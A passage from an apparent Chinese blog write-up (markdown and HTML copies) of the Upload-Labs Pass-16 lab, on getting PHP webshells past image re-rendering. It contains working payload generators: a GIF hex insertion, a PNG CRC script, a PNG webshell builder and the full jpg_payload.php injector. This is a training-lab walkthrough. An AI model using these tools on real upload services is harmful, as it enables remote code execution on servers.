4**工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件**相同**的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。`<?php phpinfo(); ?>`的十六进制是`3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E`直接粘贴插入，在右边框中右键保存文件再进行上传。\n\n#### 文件包含验证\t\n\n​\t上传以后进行文件包含，代码执行成功。\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204104.png)\n\n​\t为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。\n\n\n\n### png格式\n\n​\t这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204635.png)\n\n​\t这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的**头标识**部分，修改的话就不是png格式图片，更过不了。\n\n​\t所以我直接看答案了，还是前言里的[博客](https://xz.aliyun.com/t/2657#toc-3)。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。\n\n​\t所以又出来了两种方法：\n\n1. 修改CRC码\n2. 直接生成图片\n\n#### 计算CRC码\n\n​\t计算CRC码的`python`脚本\n\n```\nimport binascii\nimport re\n\npng = open(r'1.png','rb')\na = png.read()\npng.close()\nhexstr = binascii.b2a_hex(a)\n\n''' PLTE crc '''\ndata =  '504c5445'+ re.findall('504c5445(.*?)49444154',hexstr)[0]\ncrc = binascii.crc32(data[:-16].decode('hex')) & 0xffffffff\nprint hex(crc)\n```\n\n##### 准备\n\n​\tphp底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分**写入代码**，再重新计算CRC码，再修改原来的CRC码即可。\n\n##### \t计算CRC码\n\n​\t脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。\n\n\n\n这个方法我没有尝试，因为我不会python。~~都2020年了还有人不会python，不会吧不会吧~~。😒\n\n等我学会在回来改这一篇吧。\n\n#### 直接生成图片（写入实际数据模块）\n\n​\t国外大牛的脚本，直接运行就会生成一个图片\n\n```\n<?php\n$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,\n           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,\n           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,\n           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,\n           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,\n           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,\n           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,\n           0x66, 0x44, 0x50, 0x33);\n\n\n\n$img = imagecreatetruecolor(32, 32);\n\nfor ($y = 0; $y < sizeof($p); $y += 3) {\n   $r = $p[$y];\n   $g = $p[$y+1];\n   $b = $p[$y+2];\n   $color = imagecolorallocate($img, $r, $g, $b);\n   imagesetpixel($img, round($y / 3), 0, $color);\n}\n\nimagepng($img,'./1.png');\n?>\n```\n\n​\tphp指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为`php.exe`的可执行文件，它是php提供的一种**CLI**模式，也就是**命令行模式**。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。\n\n​\t还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。\n\n​\t运行成功以后会找到一个名为**1.png**的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。\n\n​\t但是这个生成的图片php代码是`<?=$_GET[0]($_POST[1]);?>`，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，~~应该算吧~~\n\n### jpg格式\n\n​\t同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码\n\n```php\n?php\n    /*\n\n    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().\n    It is necessary that the size and quality of the initial image are the same as those of the processed image.\n\n    1) Upload an arbitrary image via secured files upload script\n    2) Save the processed image and launch:\n    jpg_payload.php <jpg_name.jpg>\n\n    In case of successful injection you will get a specially crafted image, which should be uploaded again.\n\n    Since the most straightforward injection method is used, the following problems can occur:\n    1) After the second processing the injected data may become partially corrupted.\n    2) The jpg_payload.php script outputs \"Something's wrong\".\n    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.\n\n    Sergey Bobrov @Black2Fan.\n\n    See also:\n    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/\n\n    */\n\n    $miniPayload = \"<?=phpinfo();?>\";\n\n\n    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {\n        die('php-gd is not installed');\n    }\n\n    if(!isset($argv[1])) {\n        die('php jpg_payload.php <jpg_name.jpg>');\n    }\n\n    set_error_handler(\"custom_error_handler\");\n\n    for($pad = 0; $pad < 1024; $pad++) {\n        $nullbytePayloadSize = $pad;\n        $dis = new DataInputStream($argv[1]);\n        $outStream = file_get_contents($argv[1]);\n        $extraBytes = 0;\n        $correctImage = TRUE;\n\n        if($dis->readShort() != 0xFFD8) {\n            die('Incorrect SOI marker');\n        }\n\n        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {\n            $marker = $dis->readByte();\n            $size = $dis->readShort() - 2;\n            $dis->skip($size);\n            if($marker === 0xDA) {\n                $startPos = $dis->seek();\n                $outStreamTmp = \n                    substr($outStream, 0, $startPos) . \n                    $miniPayload . \n                    str_repeat(\"\\0\",$nullbytePayloadSize) . \n                    substr($outStream, $startPos);\n                checkImage('_'.$argv[1], $outStreamTmp, TRUE);\n                if($extraBytes !== 0) {\n                    while((!$dis->eof())) {\n                        if($dis->readByte() === 0xFF) {\n                            if($dis->readByte !== 0x00) {\n                                break;\n                            }\n                        }\n                    }\n                    $stopPos = $dis->seek() - 2;\n                    $imageStreamSize = $stopPos - $startPos;\n                    $outStream = \n                        substr($outStream, 0, $startPos) . \n                        $miniPayload . \n                        substr(\n                            str_repeat(\"\\0\",$nullbytePayloadSize).\n                                substr($outStream, $startPos, $imageStreamSize),\n                            0,\n                            $nullbytePayloadSize+$imageStreamSize-$extraBytes) . \n                                substr($outStream, $stopPos);\n                } elseif($correctImage) {\n                    $outStream = $outStreamTmp;\n                } else {\n                    break;\n                }\n                if(checkImage('payload_'.$argv[1], $outStream)) {\n                    die('Success!');\n                } else {\n                    break;\n                }\n            }\n        }\n    }\n    unlink('payload_'.$argv[1]);\n    die('Something\\'s wrong');\n\n    function checkImage($filename, $data, $unlink = FALSE) {\n        global $correctImage;\n        file_put_contents($filename, $data);\n        $correctImage = TRUE;\n        imagecreatefromjpeg($filename);\n        if($unlink)\n            unlink($filename);\n        return $correctImage;\n    }\n\n    function custom_error_handler($errno, $errstr, $errfile, $errline) {\n        global $extraBytes, $correctImage;\n        $correctImage = FALSE;\n        if(preg_match('/(\\d+) extraneous bytes before marker/', $errstr, $m)) {\n            if(isset($m[1])) {\n                $extraBytes = (int)$m[1];\n            }\n        }\n    }\n\n    class DataInputStream {\n        private $binData;\n        private $order;\n        private $size;\n\n        public function __construct($filename, $order = false, $fromString = false) {\n            $this->binData = '';\n            $this->order = $order;\n            if(!$fromString) {\n                if(!file_exists($filename) || !is_file($filename))\n                    die('File not exists ['.$filename.']');\n                $this->binData = file_get_contents($filename);\n            } else {\n                $this->binData = $filename;\n            }\n            $this->size = strlen($this->binData);\n        }\n\n        public function seek() {\n            return ($this->size - strlen($this->binData));\n        }\n\n        public function skip($skip) {\n            $this->binData = substr($this->binData, $skip);\n        }\n\n        public function readByte() {\n            if($this->eof()) {\n                die('End Of File');\n            }\n            $byte = substr($this->binData, 0, 1);\n            $this->binData = substr($this->binData, 1);\n            return ord($byte);\n        }\n\n        public function readShort() {\n            if(strlen($this->binData) < 2) {\n                die('End Of File');\n            }\n            $short = substr($this->binData, 0, 2);\n            $this->binData = substr($this->binData, 2);\n            if($this->order) {\n                $short = (ord($short[1]) << 8) + ord($short[0]);\n            } else {\n                $short = (ord($short[0]) << 8) + ord($short[1]);\n            }\n            return $short;\n        }\n\n        public function eof() {\n            return !$this->binData||(strlen($this->binData) === 0);\n        }\n    }\n?>\n```\n\n#### 准备\n\n​\t准备一个**yoo.jpg**图片，上传经过渲染以后再下载下到本地，保存为**1.jpg**。\n\n#### 插入代码\n\n​\t使用脚本处理**1.jpg**插入php代码，执行命令`php jpg_payload.php 1.jpg`。php命令执行方法上面有。执行成功以后应该如图所示：\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116212640.png)\n\n​\t执行的目录下会多出一个名为`payload_1.jpg`的文件，这就是制作好的图片马。大佬的源码我是修改了一下的，可以修改上面的第25行代码，自定义插入想要的代码。\n\n#### 上传并验证\n\n​\t上传以后同样先确定图片的名称和地址，适用文件包含进行验证\n\n![](https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116215008.png)\n\n​\t如果如图所示，我们的图片马就上传成功了。**需要提醒：有些图片不行可能需要多换几个图片试一试！！！**\n\n呼，终于可以休息了。\n\n\n\n\n\n","slug":"Upload-Labs4","published":1,"updated":"2021-12-30T09:42:54.198Z","_id":"ckrr3f9bz003uhotc802v6kfl","comments":1,"layout":"post","photos":[],"link":"","content":"<h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>​    我在这道题上花了快一天的时间，但是也学到了不少姿势，觉得东西应该足够多，而且参考了的博客发现这道题算是有歧义的，不知道作者想要考察的点是哪一个，所以算是有两种解法吧，可惜的是两种方法都不算是大成功，只有部分成功执行了。</p>\n<p>​    参考博客：<a href=\"https://xz.aliyun.com/t/2657#toc-4\">upload-labs之pass 16详细分析</a></p>\n<h2 id=\"Pass-16\"><a href=\"#Pass-16\" class=\"headerlink\" title=\"Pass-16\"></a>Pass-16</h2><p>​    源码（三种图片的判定，只贴一个吧，篇幅小一点）：</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$is_upload</span> = <span class=\"literal\">false</span>;</span><br><span class=\"line\"><span class=\"variable\">$msg</span> = <span class=\"literal\">null</span>;</span><br><span class=\"line\"><span class=\"keyword\">if</span> (<span class=\"keyword\">isset</span>(<span class=\"variable\">$_POST</span>[<span class=\"string\">&#x27;submit&#x27;</span>]))&#123;</span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的基本信息，文件名，类型，大小，临时文件路径</span></span><br><span class=\"line\">    <span class=\"variable\">$filename</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;name&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$filetype</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;type&#x27;</span>];</span><br><span class=\"line\">    <span class=\"variable\">$tmpname</span> = <span class=\"variable\">$_FILES</span>[<span class=\"string\">&#x27;upload_file&#x27;</span>][<span class=\"string\">&#x27;tmp_name&#x27;</span>];</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"variable\">$target_path</span>=UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.basename(<span class=\"variable\">$filename</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">// 获得上传文件的扩展名</span></span><br><span class=\"line\">    <span class=\"variable\">$fileext</span>= substr(strrchr(<span class=\"variable\">$filename</span>,<span class=\"string\">&quot;.&quot;</span>),<span class=\"number\">1</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">//判断文件后缀与类型，合法才进行上传操作</span></span><br><span class=\"line\">    <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;jpg&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/jpeg&quot;</span>))&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span>(move_uploaded_file(<span class=\"variable\">$tmpname</span>,<span class=\"variable\">$target_path</span>))&#123;</span><br><span class=\"line\">            <span class=\"comment\">//使用上传的图片生成新的图片</span></span><br><span class=\"line\">            <span class=\"variable\">$im</span> = imagecreatefromjpeg(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">            <span class=\"keyword\">if</span>(<span class=\"variable\">$im</span> == <span class=\"literal\">false</span>)&#123;</span><br><span class=\"line\">                <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;该文件不是jpg格式的图片！&quot;</span>;</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">            &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">                <span class=\"comment\">//给新图片指定文件名</span></span><br><span class=\"line\">                srand(time());</span><br><span class=\"line\">                <span class=\"variable\">$newfilename</span> = strval(rand()).<span class=\"string\">&quot;.jpg&quot;</span>;</span><br><span class=\"line\">                <span class=\"comment\">//显示二次渲染后的图片（使用用户上传图片生成的新图片）</span></span><br><span class=\"line\">                <span class=\"variable\">$img_path</span> = UPLOAD_PATH.<span class=\"string\">&#x27;/&#x27;</span>.<span class=\"variable\">$newfilename</span>;</span><br><span class=\"line\">                imagejpeg(<span class=\"variable\">$im</span>,<span class=\"variable\">$img_path</span>);</span><br><span class=\"line\">                @unlink(<span class=\"variable\">$target_path</span>);</span><br><span class=\"line\">                <span class=\"variable\">$is_upload</span> = <span class=\"literal\">true</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;上传出错！&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;png&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/png&quot;</span>))&#123;</span><br><span class=\"line\">        ......</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span> <span class=\"keyword\">if</span>((<span class=\"variable\">$fileext</span> == <span class=\"string\">&quot;gif&quot;</span>) &amp;&amp; (<span class=\"variable\">$filetype</span>==<span class=\"string\">&quot;image/gif&quot;</span>))&#123;</span><br><span class=\"line\">        .....</span><br><span class=\"line\">    &#125;<span class=\"keyword\">else</span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$msg</span> = <span class=\"string\">&quot;只允许上传后缀为.jpg|.png|.gif的图片文件！&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>​    提示：<code>本pass重新渲染了图片！</code>。说明对图片进行了二次渲染，我的理解就是把上传的图片，根据一些标准，只把图片中的图片信息提取出来，再生成一个图片，可以有效避免图片马。</p>\n<p>​    首先是分析一波源码：</p>\n<p>​    以jpg文件判定为例。获取文件名、类型、临时文件路径，获取文件后缀，进入jpg图片判定，判定的方式是通过文件后缀和文件的类型判定，再执行<code>move_uploaded_file</code>函数先把文件移动到<code>upload</code>文件夹，现在文件路径是<code>$target_path</code>，之后对图片进行二次渲染。</p>\n<p>​    二次渲染用到了<code>imagecreatefromjpeg</code>函数，官方解释：由文件或 URL 创建一个新图象，返回一图像标识符，代表了从给定的文件名取得的图像（这时候图像对象还是一个空的）。然后判断是否是一个图片文件，如果不是的话执行<code>unlink</code>函数删除文件，否则，为新图片随机一个名称，执行<code>imagejpeg</code>函数把图象输出到新文件<code> $newfilename</code>。再将之前用户上传的文件<code>$target_path</code>删除掉。</p>\n<p>​    根据上面的分析就能得出来两种思路：</p>\n<ol>\n<li><strong>访问二次渲染之前的上传的文件。</strong></li>\n<li><strong>在图片二次渲染以后图片马未失效。</strong></li>\n</ol>\n<h2 id=\"第一种方法\"><a href=\"#第一种方法\" class=\"headerlink\" title=\"第一种方法\"></a>第一种方法</h2><p>​    （Linux环境、php版本7.2.21）</p>\n<p>​    因为二次渲染那部分<code>if、else</code>无论如何都会执行<code>unlink</code>函数删除你的文件，需要在执行<code>imagecreatefromjpeg</code>时报错才能访问到自己原来上传的文件。</p>\n<h3 id=\"jpg格式\"><a href=\"#jpg格式\" class=\"headerlink\" title=\"jpg格式\"></a>jpg格式</h3><h4 id=\"准备并上传\"><a href=\"#准备并上传\" class=\"headerlink\" title=\"准备并上传\"></a>准备并上传</h4><p>​    需要准备只含有一句话木马的文件并命名为.jpg格式。直接上传。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200050.png\"></p>\n<h4 id=\"文件包含验证\"><a href=\"#文件包含验证\" class=\"headerlink\" title=\"文件包含验证\"></a>文件包含验证</h4><p>​    上传以后我使用的在线靶场网页中题目部分直接消失了，这就说明函数执行过程中出错导致页面也没有正常返回。然后就可以使用<code>inclue.php</code>文件包含访问刚刚上传的文件</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116200401.png\">    </p>\n<h3 id=\"其他格式\"><a href=\"#其他格式\" class=\"headerlink\" title=\"其他格式\"></a>其他格式</h3><p>​    如图成功访问就是图片马上传成功了。但是这个方法我只有<code>jpg</code>格式的文件上传成功了，另外两种格式的图片没有上传成功，这个我感觉需要了解<code>imagecreatefromjpeg</code>、<code>imagecreatefrompng</code>、<code>imagecreatefromgif</code>，这三个函数的原理，让其报错即可。</p>\n<h2 id=\"第二种方法\"><a href=\"#第二种方法\" class=\"headerlink\" title=\"第二种方法\"></a>第二种方法</h2><p>​    （windows环境，php版本5.2.17）</p>\n<p>​    这种方法是让图片码在经过二次渲染以后，能保证代码不会被二次渲染给过滤掉。从最简单的一个一个来。</p>\n<p>​    用到的工具是<strong>Beyond Compare 4</strong>，是一个文件比较的工具，就是查看图片渲染修改的哪些部分，还可以查看文件的16进制格式。</p>\n<h3 id=\"GIF格式\"><a href=\"#GIF格式\" class=\"headerlink\" title=\"GIF格式\"></a>GIF格式</h3><h4 id=\"准备并上传-1\"><a href=\"#准备并上传-1\" class=\"headerlink\" title=\"准备并上传\"></a>准备并上传</h4><p>​    上传一个使用<code>copy /b</code>指令制作的图片马，之前文章第13题用过。假设上传的图片马为<strong>yoo.gif</strong>，上传成功以后再下载下载的文件名为<strong>2119840023.gif</strong>。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116203245.png\"></p>\n<h4 id=\"文件比较\"><a href=\"#文件比较\" class=\"headerlink\" title=\"文件比较\"></a>文件比较</h4><p>​    使用前面说的<strong>Beyond Compare 4</strong>工具进行比较，左边是渲染前的文件，右边是渲染后的文件，图片中白色的地方就是两个文件<strong>相同</strong>的地方，红色部分则是文件不同的地方。看的出来图片文件的前面一大部分二次渲染的时候都没有改变，所以我们可以直接将代码放在这一部分逃过二次渲染。<code>&lt;?php phpinfo(); ?&gt;</code>的十六进制是<code>3C 3F 70 68 70 20 70 68 70 69 6E 66 6F 28 29 3B 20 3F 3E</code>直接粘贴插入，在右边框中右键保存文件再进行上传。</p>\n<h4 id=\"文件包含验证-1\"><a href=\"#文件包含验证-1\" class=\"headerlink\" title=\"文件包含验证\"></a>文件包含验证</h4><p>​    上传以后进行文件包含，代码执行成功。</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204104.png\"></p>\n<p>​    为了验证我们的想法，我们可以刚刚把上传的图片再下载下载，查看插入的代码是否逃过了二次渲染（废话执行成功了代码肯定在）。</p>\n<h3 id=\"png格式\"><a href=\"#png格式\" class=\"headerlink\" title=\"png格式\"></a>png格式</h3><p>​    这题自己原来打算模仿gif的方法修改图片，但是上传以后下载，对比文件十六进制不同的时候我傻了</p>\n<p><img src=\"https://cdn.jsdelivr.net/gh/guobang-yoo/PicBed@master/artical/20201116204635.png\"></p>\n<p>​    这不同还是一段一段的，根本不可能模仿gif的方法，上面那一段相同的还是图片的<strong>头标识</strong>部分，修改的话就不是png格式图片，更过不了。</p>\n<p>​    所以我直接看答案了，还是前言里的<a href=\"https://xz.aliyun.com/t/2657#toc-3\">博客</a>。png图片由3个以上的数据块组成，然后又分了图片基本信息、实际数据块、辅助数据块blablablabl，而且数据块中还有CRC码，学过计算机网络的都知道CRC码是验证错误的，自己随便插入代码以后不修改CRC码肯定是过不了的。</p>\n<p>​    所以又出来了两种方法：</p>\n<ol>\n<li>修改CRC码</li>\n<li>直接生成图片</li>\n</ol>\n<h4 id=\"计算CRC码\"><a href=\"#计算CRC码\" class=\"headerlink\" title=\"计算CRC码\"></a>计算CRC码</h4><p>​    计算CRC码的<code>python</code>脚本</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import binascii</span><br><span class=\"line\">import re</span><br><span class=\"line\"></span><br><span class=\"line\">png = open(r&#x27;1.png&#x27;,&#x27;rb&#x27;)</span><br><span class=\"line\">a = png.read()</span><br><span class=\"line\">png.close()</span><br><span class=\"line\">hexstr = binascii.b2a_hex(a)</span><br><span class=\"line\"></span><br><span class=\"line\">&#x27;&#x27;&#x27; PLTE crc &#x27;&#x27;&#x27;</span><br><span class=\"line\">data =  &#x27;504c5445&#x27;+ re.findall(&#x27;504c5445(.*?)49444154&#x27;,hexstr)[0]</span><br><span class=\"line\">crc = binascii.crc32(data[:-16].decode(&#x27;hex&#x27;)) &amp; 0xffffffff</span><br><span class=\"line\">print hex(crc)</span><br></pre></td></tr></table></figure>\n\n<h5 id=\"准备\"><a href=\"#准备\" class=\"headerlink\" title=\"准备\"></a>准备</h5><p>​    php底层在对PLTE数据块验证的时候,主要进行了CRC校验.所以可以在该部分<strong>写入代码</strong>，再重新计算CRC码，再修改原来的CRC码即可。</p>\n<h5 id=\"计算CRC码-1\"><a href=\"#计算CRC码-1\" class=\"headerlink\" title=\"计算CRC码\"></a>计算CRC码</h5><p>​    脚本会打开名为1.png的文件然后输出计算以后的CRC码结果。在把结果覆盖原来的CRC码上传图片就不会出错了。</p>\n<p>这个方法我没有尝试，因为我不会python。<del>都2020年了还有人不会python，不会吧不会吧</del>。😒</p>\n<p>等我学会在回来改这一篇吧。</p>\n<h4 id=\"直接生成图片（写入实际数据模块）\"><a href=\"#直接生成图片（写入实际数据模块）\" class=\"headerlink\" title=\"直接生成图片（写入实际数据模块）\"></a>直接生成图片（写入实际数据模块）</h4><p>​    国外大牛的脚本，直接运行就会生成一个图片</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&lt;?php</span><br><span class=\"line\">$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,</span><br><span class=\"line\">           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,</span><br><span class=\"line\">           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,</span><br><span class=\"line\">           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,</span><br><span class=\"line\">           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,</span><br><span class=\"line\">           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,</span><br><span class=\"line\">           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,</span><br><span class=\"line\">           0x66, 0x44, 0x50, 0x33);</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">$img = imagecreatetruecolor(32, 32);</span><br><span class=\"line\"></span><br><span class=\"line\">for ($y = 0; $y &lt; sizeof($p); $y += 3) &#123;</span><br><span class=\"line\">   $r = $p[$y];</span><br><span class=\"line\">   $g = $p[$y+1];</span><br><span class=\"line\">   $b = $p[$y+2];</span><br><span class=\"line\">   $color = imagecolorallocate($img, $r, $g, $b);</span><br><span class=\"line\">   imagesetpixel($img, round($y / 3), 0, $color);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">imagepng($img,&#x27;./1.png&#x27;);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n\n<p>​    php指令怎么执行？如果你本机有php环境，可以在php的根目录下找到一个名为<code>php.exe</code>的可执行文件，它是php提供的一种<strong>CLI</strong>模式，也就是<strong>命令行模式</strong>。我把php脚本放在了php的根目录，然后cmd切换到对应目录执行。</p>\n<p>​    还有一种方法是借用本地搭建的靶机环境，把php放在目录使用浏览器访问一下即可。</p>\n<p>​    运行成功以后会找到一个名为<strong>1.png</strong>的图片。这个就是生成的图片马了。可以尝试上传进行渲染以后下载到本地，使用文件比较验证。</p>\n<p>​    但是这个生成的图片php代码是<code>&lt;?=$_GET[0]($_POST[1]);?&gt;</code>，应该是个一句话木马但是现在的我还不会用。源码也不知道怎么修改，总之图片渲染以后代码没有被去掉就算成功了吧，<del>应该算吧</del></p>\n<h3 id=\"jpg格式-1\"><a href=\"#jpg格式-1\" class=\"headerlink\" title=\"jpg格式\"></a>jpg格式</h3><p>​    同样看答案。国外大牛写的脚本jpg_payload.php，可以向jpg图片里写入代码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span 